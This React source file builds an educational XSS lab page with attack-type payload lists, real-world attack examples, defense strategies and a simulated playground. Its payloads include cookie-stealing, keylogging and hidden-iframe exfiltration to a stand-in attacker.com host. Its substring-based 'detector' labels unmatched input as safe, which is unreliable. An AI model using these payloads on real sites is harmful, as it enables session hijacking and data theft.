'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Code } from '@/components/ui/code'
import { Code2, Shield, AlertTriangle, Play, Eye, Lock, FileText, Zap, Globe } from 'lucide-react'

export default function XSSLab() {
  const [activeTab, setActiveTab] = useState('demo')
  const [xssInput, setXssInput] = useState('')
  const [xssResult, setXssResult] = useState<any>(null)
  const [isExecuting, setIsExecuting] = useState(false)
  const [attackType, setAttackType] = useState('reflected')
  const [storedComments, setStoredComments] = useState<string[]>([
    'Welcome to the comment section!',
    'This is a safe comment.',
    'Great website!'
  ])

  const xssPayloads = {
    reflected: [
      { name: 'Basic Script', payload: '<script>alert("XSS")</script>', description: 'Simple alert injection' },
      { name: 'Image Handler', payload: '<img src=x onerror=alert("XSS")>', description: 'Use image error handler' },
      { name: 'SVG Injection', payload: '<svg onload=alert("XSS")>', description: 'SVG onload event' },
      { name: 'Input Focus', payload: '<input autofocus onfocus=alert("XSS")>', description: 'Auto-focus input' }
    ],
    stored: [
      { name: 'Stored Script', payload: '<script>document.body.style.background="red"</script>', description: 'Persistent XSS attack' },
      { name: 'Cookie Stealer', payload: '<script>fetch("http://attacker.com?c="+document.cookie)</script>', description: 'Steal user cookies' },
      { name: 'Defacement', payload: '<script>document.body.innerHTML="HACKED!"</script>', description: 'Website defacement' },
      { name: 'Keylogger', payload: '<script>document.onkeypress=function(e){fetch("http://attacker.com?key="+e.key)}</script>', description: 'Keylogging attack' }
    ],
    dom: [
      { name: 'DOM Source', payload: '#<script>alert("DOM XSS")</script>', description: 'Hash-based XSS' },
      { name: 'Fragment Injection', payload: '?name=<script>alert("Fragment XSS")</script>', description: 'URL fragment injection' },
      { name: 'JSON Injection', payload: '{"data":"<script>alert(\\"JSON XSS\\")</script>"', description: 'JSON parsing XSS' },
      { name: 'Eval Source', payload: 'javascript:alert("JS Protocol XSS")', description: 'JavaScript protocol' }
    ],
    blind: [
      { name: 'Blind Detection', payload: '<img src=x onerror=this.src="http://attacker.com/detect?id=1">', description: 'Exfiltrate via image load' },
      { name: 'CSS Injection', payload: '<style>@import "http://attacker.com/style.css";</style>', description: 'CSS-based exfiltration' },
      { name: 'Meta Refresh', payload: '<meta http-equiv="refresh" content="0;url=http://attacker.com/steal?data='+encodeURIComponent(document.cookie)+'">', description: 'Meta redirect' },
      { name: 'Iframe Injection', payload: '<iframe src="http://attacker.com/collect?data='+encodeURIComponent(document.cookie)+'" style="display:none"></iframe>', description: 'Hidden iframe exfil' }
    ]
  }

  const executeXSS = (input: string) => {
    setIsExecuting(true)
    
    setTimeout(() => {
      try {
        let result = null
        
        if (input.includes('<script>') || input.includes('onerror') || input.includes('onload') || input.includes('onfocus')) {
          // XSS detected
          if (input.includes('alert')) {
            result = {
              type: 'alert_xss',
              payload: input,
              message: 'XSS attack successful! JavaScript alert would execute in victim\'s browser.',
              severity: 'high',
              impact: 'Annoying pop-ups, potential for more serious attacks'
            }
          } else if (input.includes('document.cookie')) {
            result = {
              type: 'cookie_theft',
              payload: input,
              message: 'Cookie theft XSS detected! Attacker could steal session cookies.',
              severity: 'critical',
              impact: 'Session hijacking, account takeover'
            }
          } else if (input.includes('innerHTML') || input.includes('background')) {
            result = {
              type: 'defacement',
              payload: input,
              message: 'Website defacement XSS! Attacker can modify page content.',
              severity: 'high',
              impact: 'Website vandalism, content modification'
            }
          } else if (input.includes('onkeypress') || input.includes('fetch')) {
            result = {
              type: 'data_exfiltration',
              payload: input,
              message: 'Data exfiltration XSS! Attacker can steal user input.',
              severity: 'critical',
              impact: 'Keystroke logging, data theft'
            }
          } else {
            result = {
              type: 'generic_xss',
              payload: input,
              message: 'XSS attack detected! JavaScript code injection successful.',
              severity: 'high',
              impact: 'Various malicious activities possible'
            }
          }
        } else if (input.includes('<img>') || input.includes('<svg>') || input.includes('<input>')) {
          // HTML injection
          result = {
            type: 'html_injection',
            payload: input,
            message: 'HTML injection detected! Could lead to XSS.',
            severity: 'medium',
            impact: 'UI manipulation, potential XSS'
          }
        } else {
          // Normal input
          result = {
            type: 'safe',
            payload: input,
            message: 'Input appears safe or was properly sanitized.',
            severity: 'low',
            impact: 'No security risk'
          }
        }
        
        setXssResult(result)
      } catch (error) {
        setXssResult({
          type: 'error',
          payload: input,
          message: 'Error processing input.',
          severity: 'medium'
        })
      } finally {
        setIsExecuting(false)
      }
    }, 1500)
  }

  const addComment = (comment: string) => {
    if (comment.trim()) {
      setStoredComments([...storedComments, comment])
      setXssInput('')
    }
  }

  const realWorldAttacks = [
    {
      name: 'Samy MySpace Worm (2005)',
      description: 'Self-propagating XSS worm that infected over 1 million MySpace profiles in 24 hours',
      technique: 'Stored XSS with worm propagation',
      impact: 'Profile defacement, massive infection spread',
      example: '<script id="samy" src="http://xss.rocks/samy.js"></script>'
    },
    {
      name: 'Twitter XSS (2010)',
      description: 'XSS vulnerability allowed attackers to create "tweet storms" and spread malware',
      technique: 'DOM-based XSS in Twitter interface',
      impact: 'Account takeover, malware distribution',
      example: 'onmouseover="javascript:alert(\'XSS\')"'
    },
    {
      name: 'Facebook Worm (2011)',
      description: 'XSS worm that posted malicious content on users\' walls',
      technique: 'Reflected XSS with social engineering',
      impact: 'Spam propagation, reputation damage',
      example: '<script>location.href="http://malicious.com/steal?token="+access_token</script>'
    }
  ]

  const defenseStrategies = [
    {
      name: 'Input Validation',
      description: 'Validate and sanitize all user inputs',
      techniques: [
        'Whitelist allowed characters',
        'Reject HTML/JavaScript content',
        'Validate input format and length',
        'Use strict type checking'
      ]
    },
    {
      name: 'Output Encoding',
      description: 'Encode data before rendering in HTML',
      techniques: [
        'HTML entity encoding (&lt;, &gt;, &amp;)',
        'Attribute encoding',
        'JavaScript encoding',
        'URL encoding'
      ]
    },
    {
      name: 'Content Security Policy',
      description: 'Implement CSP headers to restrict script execution',
      techniques: [
        'Restrict script sources',
        'Disable inline scripts',
        'Object-src and frame-src restrictions',
        'Report-uri for violations'
      ]
    },
    {
      name: 'Secure Frameworks',
      description: 'Use frameworks with built-in XSS protection',
      techniques: [
        'React auto-escaping',
        'Angular template sanitization',
        'Vue.js v-text directive',
        'Server-side template engines'
      ]
    }
  ]

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-4 sm:p-6 lg:p-8">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-6 sm:mb-8">
          <div className="flex flex-col sm:flex-row sm:items-center space-y-3 sm:space-y-0 sm:space-x-3 mb-4">
            <div className="p-2 sm:p-3 bg-orange-500 rounded-lg self-start">
              <Code2 className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
            </div>
            <div>
              <h1 className="text-2xl sm:text-3xl font-bold text-slate-900">Cross-Site Scripting (XSS) Lab</h1>
              <p className="text-sm sm:text-base text-slate-600">Learn how attackers inject malicious scripts into web pages and how to prevent XSS attacks</p>
            </div>
          </div>
          <Alert className="mb-6">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription className="text-sm">
              XSS attacks allow malicious scripts to be executed in victims' browsers. This lab demonstrates reflected, stored, and DOM-based XSS attacks with comprehensive defense strategies.
            </AlertDescription>
          </Alert>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-2 sm:grid-cols-4 h-auto">
            <TabsTrigger value="demo" className="text-xs sm:text-sm">XSS Demo</TabsTrigger>
            <TabsTrigger value="attacks" className="text-xs sm:text-sm">Real-World Attacks</TabsTrigger>
            <TabsTrigger value="defense" className="text-xs sm:text-sm">Defense Strategies</TabsTrigger>
            <TabsTrigger value="playground" className="text-xs sm:text-sm">XSS Playground</TabsTrigger>
          </TabsList>

          {/* XSS Demo Tab */}
          <TabsContent value="demo" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6">
              {/* XSS Control Panel */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Code2 className="w-5 h-5" />
                    <span>XSS Attack Control</span>
                  </CardTitle>
                  <CardDescription>
                    Test different XSS attack vectors
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-3">
                    <div>
                      <label className="text-sm font-medium mb-2 block">Attack Type</label>
                      <div className="grid grid-cols-2 gap-1">
                        {Object.keys(xssPayloads).map((type) => (
                          <Button
                            key={type}
                            onClick={() => setAttackType(type)}
                            variant={attackType === type ? 'default' : 'outline'}
                            size="sm"
                            className="capitalize h-8 text-xs"
                          >
                            {type}
                          </Button>
                        ))}
                      </div>
                    </div>

                    <div>
                      <label className="text-sm font-medium mb-2 block">XSS Payloads</label>
                      <div className="space-y-2 max-h-48 overflow-y-auto">
                        {xssPayloads[attackType as keyof typeof xssPayloads].map((payload, index) => (
                          <div
                            key={index}
                            className="p-2 border rounded cursor-pointer hover:bg-slate-50"
                            onClick={() => setXssInput(payload.payload)}
                          >
                            <div className="font-medium text-sm">{payload.name}</div>
                            <div className="text-xs text-slate-600">{payload.description}</div>
                          </div>
                        ))}
                      </div>
                    </div>

                    <div>
                      <label className="text-sm font-medium mb-2 block">XSS Input</label>
                      <textarea
                        value={xssInput}
                        onChange={(e) => setXssInput(e.target.value)}
                        placeholder="Enter XSS payload or try normal text"
                        className="w-full p-2 border rounded-md font-mono text-sm h-20"
                      />
                    </div>

                    <Button
                      onClick={() => executeXSS(xssInput)}
                      disabled={!xssInput.trim() || isExecuting}
                      className="w-full h-10"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      {isExecuting ? 'Analyzing...' : 'Test XSS Payload'}
                    </Button>
                  </div>
                </CardContent>
              </Card>

              {/* XSS Results */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Eye className="w-5 h-5" />
                    <span>XSS Analysis</span>
                  </CardTitle>
                  <CardDescription>
                    Attack detection and impact analysis
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  {xssResult ? (
                    <div className="space-y-4">
                      <div className={`p-3 rounded-lg ${
                        xssResult.severity === 'critical' ? 'bg-red-100 border-red-300' :
                        xssResult.severity === 'high' ? 'bg-red-50 border-red-200' :
                        xssResult.severity === 'medium' ? 'bg-yellow-50 border-yellow-200' :
                        'bg-green-50 border-green-200'
                      }`}>
                        <div className="flex items-center space-x-2 mb-2">
                          <Shield className="w-4 h-4" />
                          <span className="font-medium text-sm">XSS Analysis</span>
                        </div>
                        <p className="text-sm">{xssResult.message}</p>
                        <Badge variant={
                          xssResult.severity === 'critical' ? 'destructive' :
                          xssResult.severity === 'high' ? 'destructive' :
                          xssResult.severity === 'medium' ? 'default' :
                          'secondary'
                        } className="mt-2">
                          {xssResult.type.toUpperCase()}
                        </Badge>
                      </div>

                      {xssResult.payload && (
                        <div className="space-y-2">
                          <h4 className="font-semibold text-sm">Payload Used:</h4>
                          <Code className="block p-2 bg-slate-50 rounded text-xs break-all">
                            {xssResult.payload}
                          </Code>
                        </div>
                      )}

                      {xssResult.impact && (
                        <div className="space-y-2">
                          <h4 className="font-semibold text-sm">Impact:</h4>
                          <p className="text-sm text-slate-600">{xssResult.impact}</p>
                        </div>
                      )}
                    </div>
                  ) : (
                    <div className="text-center text-slate-500 py-8">
                      <Code2 className="w-12 h-12 mx-auto mb-4 opacity-50" />
                      <p>Test a payload to see XSS analysis</p>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Real-World Attacks Tab */}
          <TabsContent value="attacks" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6">
              {realWorldAttacks.map((attack, index) => (
                <Card key={index}>
                <CardHeader>
                  <CardTitle className="text-base sm:text-lg">{attack.name}</CardTitle>
                  <Badge variant="destructive" className="text-xs">Critical</Badge>
                </CardHeader>
                  <CardContent className="space-y-4">
                    <p className="text-sm text-slate-600">{attack.description}</p>
                    
                    <div className="space-y-2">
                      <div>
                        <span className="font-semibold text-sm">Technique:</span>
                        <p className="text-xs sm:text-sm text-slate-600">{attack.technique}</p>
                      </div>

                      <div>
                        <span className="font-semibold text-sm">Impact:</span>
                        <p className="text-xs sm:text-sm text-slate-600">{attack.impact}</p>
                      </div>

                      <div>
                        <span className="font-semibold text-sm">Example:</span>
                        <Code className="block text-xs mt-1">{attack.example}</Code>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          {/* Defense Strategies Tab */}
          <TabsContent value="defense" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-6">
              {defenseStrategies.map((strategy, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="flex items-center space-x-2">
                      <Shield className="w-5 h-5" />
                      <span>{strategy.name}</span>
                    </CardTitle>
                  <CardDescription className="text-sm">{strategy.description}</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-2">
                      <h4 className="font-semibold text-sm">Implementation:</h4>
                      <ul className="space-y-1">
                        {strategy.techniques.map((technique, techIndex) => (
                          <li key={techIndex} className="flex items-start space-x-2">
                            <div className="w-1.5 h-1.5 bg-blue-500 rounded-full mt-2 flex-shrink-0"></div>
                            <span className="text-xs sm:text-sm">{technique}</span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          {/* XSS Playground Tab */}
          <TabsContent value="playground" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6">
              {/* Comment Section (Stored XSS Demo) */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <FileText className="w-5 h-5" />
                    <span>Comment Section</span>
                  </CardTitle>
                  <CardDescription>
                    Simulate stored XSS in a comment system
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-3">
                    <div>
                      <label className="text-sm font-medium mb-2 block">Add Comment</label>
                      <textarea
                        value={xssInput}
                        onChange={(e) => setXssInput(e.target.value)}
                        placeholder="Enter your comment (try XSS payloads!)"
                        className="w-full p-2 border rounded-md text-sm h-16"
                      />
                    </div>
                    
                    <Button
                      onClick={() => addComment(xssInput)}
                      disabled={!xssInput.trim()}
                      className="w-full"
                    >
                      Post Comment
                    </Button>
                  </div>

                  <div className="space-y-2">
                    <h4 className="font-semibold text-sm">Comments:</h4>
                    <div className="space-y-2 max-h-64 overflow-y-auto">
                      {storedComments.map((comment, index) => (
                        <div key={index} className="p-2 bg-slate-50 rounded text-sm">
                          {comment}
                        </div>
                      ))}
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Search Simulation (Reflected XSS Demo) */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Globe className="w-5 h-5" />
                    <span>Search Simulation</span>
                  </CardTitle>
                  <CardDescription>
                    Simulate reflected XSS in search functionality
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-3">
                    <div>
                      <label className="text-sm font-medium mb-2 block">Search Query</label>
                      <input
                        type="text"
                        value={xssInput}
                        onChange={(e) => setXssInput(e.target.value)}
                        placeholder="Enter search terms (try XSS payloads!)"
                        className="w-full p-2 border rounded-md text-sm"
                      />
                    </div>
                    
                    <Button
                      onClick={() => executeXSS(xssInput)}
                      disabled={!xssInput.trim()}
                      className="w-full h-10"
                    >
                      Search
                    </Button>
                  </div>

                  <div className="space-y-2">
                    <h4 className="font-semibold text-sm">Search Results:</h4>
                    {xssResult ? (
                      <div className="p-3 bg-slate-50 rounded text-sm">
                        <p>Searching for: <span className="font-medium">{xssInput}</span></p>
                        <p className="mt-2 text-slate-600">
                          {xssResult.type === 'safe' ? 'No XSS detected in search query.' : 'XSS payload detected in search!'}
                        </p>
                      </div>
                    ) : (
                      <div className="p-3 bg-slate-50 rounded text-sm text-slate-500">
                        Enter a search query to see results
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}